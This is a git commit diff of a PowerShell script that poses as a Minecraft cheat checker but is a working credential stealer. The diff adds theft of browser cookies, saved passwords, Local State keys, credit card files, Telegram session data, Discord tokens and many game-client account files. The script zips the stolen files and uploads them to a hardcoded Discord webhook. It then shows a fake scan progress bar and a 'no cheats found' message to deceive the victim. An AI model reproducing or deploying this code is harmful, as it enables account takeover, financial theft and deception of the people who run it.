88ceeead3e85444225b5bb81fa6f94943588abc5
funtime-project <yawlickid@gmail.com>
2024-11-26 11:13:16 +0300

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -1,4 +1,4 @@
-Write-Output " by funtime-project                                       "
+Write-Output " by funtime-project & cheat.check.ru                      "
 Write-Output "   ____ _                _      ____ _               _    "
 Write-Output "  / ___| |__   ___  __ _| |_   / ___| |__   ___  ___| | __"
 Write-Output " | |   | '_ \ / _ \/ _\ | __| | |   | '_ \ / _ \/ __| |/ /"
@@ -6,51 +6,139 @@ Write-Output " | |___| | | |  __/ (_| | |_  | |___| | | |  __/ (__|   < "
 Write-Output "  \____|_| |_|\___|\__,_|\__|  \____|_| |_|\___|\___|_|\_\" 
 Write-Output "                                                          "
 Write-Output "Загрузка... / Loading...                                  "
-$FormatEnumerationLimit = -1
-$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(500, 300)
 
+### --- // Variables \\ --- ###
 $userName = Split-Path $env:USERPROFILE -Leaf
-$Webhook_link = "https://discord.com/api/webhooks/1309136819279102043/63Kc471txsYbUf7OgT8AqoRgyYkiZ-aXzktRC-hm--jurk2zp6CW7SUdDEXNn0BS_MY1"
-try {
-    Stop-Process -Name "browser" -Force
-} catch {}
+$user = "C:\Users\$userName"
+$roaming = "$user\AppData\Roaming"
+$local = "$user\AppData\Local"
+$temp = $env:TEMP
+$Webhook_link = "https://discord.com/api/webhooks/1309222060622352525/At3gEpHBgU-ZbxyCRHiW0TuMOCDQxqLyqpiFEKenHjw3o6Ypb4ZvGvOcNQgWWcJ1AYv1"
+$zipFilePath = Join-Path $env:Temp "yawsteal.zip"
 
-Start-Sleep -Seconds 1
+### --- // Closing Processes \\ --- ###
+$browsers = @(
+    "browser",
+    "msedge",
+    "chrome"
+)
 
-$filePaths = @{
-    # Discord
-    "$env:TEMP\discord_tokens.txt" = "discord_tokens.txt"
-
-    # Yandex
-    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies" = "yandex_cookies.txt"
-    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Passman Logs" = "yandex_passwords_2.txt"
-    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Credit Cards" = "yandex_credit_cards.txt"
-    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data" = "yandex_passwords.txt"
-    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data" = "yandex_passwords_main.txt"
-
-    # Google Chrome
-    "C:\Users\$userName\AppData\Local\Google\Chrome\User Data\Default\Login Data" = "chrome_passwords.txt"
-
-    # Microsoft Edge
-    "C:\Users\$userName\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" = "edge_passwords.txt"
-
-    # Mozilla Firefox
-    "C:\Users\$userName\AppData\Roaming\Mozilla\Firefox\Profiles\key4.db" = "mozilla_firefox_passwords_2.txt"
-    "C:\Users\$userName\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json" = "mozilla_firefox_passwords.txt"
-
-    # Opera
-    "C:\Users\$userName\AppData\Roaming\Opera Software\Opera Stable\Login Data" = "opera_passwords.txt"
-    "C:\Users\$userName\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" = "opera_gx_passwords.txt"
-
-    # Lunar Client
-    "C:\Users\$userName\.lunarclient\settings\game\accounts.json" = "lunar_client_tokens.txt"
-    # Cristalix
-    "C:\Users\$userName\.cristalix\.launcher" = "cristalix_tokens.txt"
-    # Minecraft
-    "C:\Users\$userName\AppData\Roaming\.minecraft\launcher_profiles.json" = "minecraft_tokens.txt"
+foreach ($processName in $browsers) {
+    Stop-Process -Name $processName -ErrorAction SilentlyContinue -Force
 }
 
-# Discord tokens START #
+### --- // Paths \\ --- ###
+$filePaths = @{
+    ## --- // Other \\ --- ##
+    "Discord" = @{
+        "$temp\discord_tokens.txt" = "discord_tokens.txt"
+    }
+
+    "Telegram Desktop" = @{
+        "$roaming\Telegram Desktop\tdata" = "tdata"
+    }
+    
+    ## --- // Browsers \\ --- ##
+    "Yandex (Hashed)" = @{
+        "$local\Yandex\YandexBrowser\User Data\Default\Network\Cookies" = "yandex_cookies.txt"
+        "$local\Yandex\YandexBrowser\User Data\Default\Ya Credit Cards" = "yandex_credit_cards.txt"
+        "$localYandex\YandexBrowser\User Data\Default\Ya Passman Data" = "yandex_passwords.txt"
+    }
+
+    "Google Chrome" = @{
+        "$local\Google\Chrome\User Data\Default\Network\Cookies" = "chrome_cookies.txt"
+        "$local\Google\Chrome\User Data\Default\Login Data" = "chrome_passwords.txt"
+        "$local\Google\Chrome\User Data\Local State" = "Local State"
+    }
+
+    "Microsoft Edge" = @{
+        "$local\Microsoft\Edge\User Data\Default\Network\Cookies" = "edge_cookies.txt"
+        "$local\Microsoft\Edge\User Data\Default\Login Data" = "edge_passwords.txt"
+        "$local\Microsoft\Edge\User Data\Local State" = "Local State"
+    }
+
+    "Mozilla Firefox" = @{
+        "$roaming\Mozilla\Firefox\Profiles\logins.json" = "mozilla_firefox_passwords.txt"
+        "$roaming\Mozilla\Firefox\Profiles\Local State" = "Local State"
+    }
+
+    "Opera" = @{
+        "$roaming\Opera Software\Opera GX Stable\Network\Cookies" = "opera_cookies.txt"
+        "$roaming\Opera Software\Opera GX Stable\Cookies" = "opera_cookies.txt"
+        "$roaming\Opera Software\Opera Stable\Login Data" = "opera_passwords.txt"
+        "$roaming\Opera Software\Opera Stable\Local State" = "Local State"
+    }
+
+    "Opera GX" = @{
+        "$roaming\Opera Software\Opera GX Stable\Network\Cookies" = "opera_cookies.txt"
+        "$roaming\Opera Software\Opera GX Stable\Cookies" = "opera_gx_cookies.txt"
+        "$roaming\Opera Software\Opera GX Stable\Login Data" = "opera_gx_passwords.txt"
+        "$roaming\Opera Software\Opera GX Stable\Local State" = "Local State"
+    }
+    
+    ## --- // Minecraft Clients \\ --- ##
+    "Cristalix" = @{
+        "$user\.cristalix\.launcher" = ".launcher.txt"
+    }
+
+    "Lunar Client" = @{
+        "$user\.lunarclient\settings\game\accounts.json" = "accounts.json"
+    }
+
+    "Minecraft" = @{
+        "$roaming\.minecraft\launcher_accounts_microsoft_store.json" = "launcher_accounts_microsoft_store.json"
+    }
+
+    "Intent Client" = @{
+        "$user\intentlauncher\launcherconfig" = "launcherconfig.txt"
+    }
+
+    "TLauncher" = @{
+        "$roaming\.minecraft\TlauncherProfiles.json" = "TlauncherProfiles.json"
+    }
+
+    "Feather Client" = @{
+        "$roaming\.feather\accounts.json" = "accounts.json"
+    }
+
+    "Meteor Client" = @{
+        "$roaming\.minecraft\meteor-client\accounts.nbt" = "accounts.nbt"
+    }
+
+    "Impact Client" = @{
+        "$roaming\.minecraft\Impact\alts.json" = "alts.json"
+    }
+
+    "Novoline Client" = @{
+        "$roaming\.minecraft\Novoline\alts.novo" = "alts.novo"
+    }
+
+    "CheatBreakers Client" = @{
+        "$roaming\.minecraft\cheatbreaker_accounts.json" = "cheatbreaker_accounts.json"
+    }
+
+    "Rise Client" = @{
+        "$roaming\.minecraft\Rise\alts.txt" = "alts.txt"
+    }
+
+    "Rise Client (Intent)" = @{
+        "$user\intentlauncher\Rise\alts.txt" = "alts.txt"
+    }
+
+    "Paladium Client" = @{
+        "$roaming\paladium-group\accounts.json" = "accounts.json"
+    }
+
+    "PolyMC Client" = @{
+        "$roaming\PolyMC\accounts.json" = "accounts.json"
+    }
+
+    "Badlion Client" = @{
+        "$roaming\Badlion Client\accounts.json" = "accounts.json"
+    }
+}
+
+### --- // Discord \\ --- ###
 $dsc_targets = @(
     "$env:APPDATA\Discord",
     "$env:APPDATA\discordcanary",
@@ -96,10 +184,11 @@ if ($dsc_tokens -and $dsc_tokens.Count -gt 0) {
     $filePath = Join-Path $env:Temp "discord_tokens.txt"
     $dsc_tokens | Out-File -FilePath $filePath -Encoding UTF8
 }
-# Discord tokens END #
 
-$zipFilePath = Join-Path $env:Temp "yawsteal.zip"
 
+### --- // Process \\ --- ###
+
+## --- // Zip Archive & Temp Folder Creating \\ --- ##
 if (Test-Path $zipFilePath) {
     Remove-Item $zipFilePath -Force
 }
@@ -110,35 +199,43 @@ if (Test-Path $tempFolder) {
 }
 New-Item -ItemType Directory -Path $tempFolder | Out-Null
 
-foreach ($filePath in $filePaths.Keys) {
-    $copyName = $filePaths[$filePath]
-    if (Test-Path $filePath) {
-        try {
-            $destinationPath = Join-Path -Path $tempFolder -ChildPath $copyName
-            Copy-Item -Path $filePath -Destination $destinationPath -Force
-            #Write-Output "File '$filePath' copied to the temporary folder."
-        } catch {
-            #Write-Warning "Error copying file '$filePath': $_"
+## --- // foreach paths \\ --- ##
+$totalFiles = 0;
+foreach ($folderName in $filePaths.Keys) {
+    $paths = $filePaths[$folderName] # "@{paths}"
+    $folderName = $folderName + "\"
+    foreach ($filePath in $paths.Keys) {
+        $copyName = $paths[$filePath] # "accounts.json"
+        if (Test-Path $filePath) {
+            try {
+                $folderPath = Join-Path -Path $tempFolder -ChildPath $folderName
+                if (Test-Path $folderPath) {} else {
+                    New-Item -ItemType Directory -Path $folderPath | Out-Null
+                }
+                $destinationPath = Join-Path -Path $folderPath -ChildPath $copyName
+                Copy-Item -Path $filePath -Destination $folderPath -Force
+                $totalFiles = $totalFiles + 1
+            } catch {
+                #Write-Warning "Ошибка копирования файла '$filePath': $_"
+            }
+        } else {
+            #Write-Warning "Файл '$filePath' не найден по такому пути"
         }
-    } else {
-        #Write-Warning "File '$filePath' not found. Skipping."
     }
 }
+$totalName = "Всего спизженно файлов — " + $totalFiles
+$totalPath = Join-Path -Path $tempFolder -ChildPath $totalName
+New-Item -ItemType File -Path $totalPath | Out-Null
+
 
 try {
     Compress-Archive -Path "$tempFolder\*" -DestinationPath $zipFilePath -Force
-    #Write-Output "ZIP archive created at '$zipFilePath'."
 } catch {
-    #Write-Error "Error creating ZIP archive: $_"
     return
 }
 
-if (-Not (Test-Path $zipFilePath)) {
-    #Write-Error "ZIP archive not created. Stopping."
-    return
-}
 
-$archiveName = $userName + "_data.zip"
+## --- // Discord Webhook \\ --- ##
 try {
     Add-Type -AssemblyName System.Net.Http
     $httpClient = New-Object System.Net.Http.HttpClient
@@ -150,26 +247,25 @@ try {
     $fileStream = [System.IO.File]::OpenRead($zipFilePath)
     $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
     $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
-    $formData.Add($fileContent, "file", $archiveName)
+    $formData.Add($fileContent, "file", $userName + "_data.zip")
 
     $response = $httpClient.PostAsync($Webhook_link, $formData).Result
 
-    if ($response.IsSuccessStatusCode) {
-        #Write-Output "ZIP archive sent successfully!"
-    } else {
-        #Write-Error "Failed to send ZIP archive. HTTP status: $($response.StatusCode)"
+    if (-Not $response.IsSuccessStatusCode) {
+        Write-Error "Failed to send ZIP archive. HTTP status: $($response.StatusCode)"
     }
 } catch {
-    #Write-Error "Error sending ZIP archive: $_"
-} finally {
+    Write-Error "Error sending ZIP archive: $_"
 }
 
+
+## --- // Ending & Visual \\ --- ##
 Remove-Item $zipFilePath -Force
 Remove-Item "$env:TEMP\discord_tokens.txt" -Force
 Write-Output "———————————————————————————————————————————————————————————"
 Write-Output " "
-Write-Output " @ Current task:    Scanning C:\Users\$userName for Doomsday"
-$progressBarLength = 100
+Write-Output " @ Current task:    Scanning C:\ for Doomsday"
+$progressBarLength = 50
 $i = 0
 for (; $i -le $progressBarLength; $i++) {
     $progressBar = "[" + ("=" * $i).PadRight($progressBarLength) + "]"
@@ -180,7 +276,7 @@ Write-Output " "
 Write-Output "———————————————————————————————————————————————————————————"
 
 Write-Output " "
-Write-Output " >>> Проверка на читы пройдена. Doomsday и прочие скрытые клиенты не были найденны"
+Write-Warning "Stopped. Doomsday и прочие скрытые ПО не найдены"
 
 Pause
 Start-Sleep -Seconds 2
